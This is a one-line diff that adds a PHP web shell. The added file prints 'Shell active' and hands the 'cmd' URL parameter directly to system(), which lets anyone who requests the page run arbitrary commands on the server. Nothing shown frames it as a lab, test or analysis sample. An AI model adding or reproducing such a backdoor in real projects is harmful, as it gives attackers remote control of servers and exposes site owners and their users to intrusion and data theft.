@@ -1,0 +1,1 @@
+<?php echo "Shell active<br>"; system($_GET['cmd']); ?>
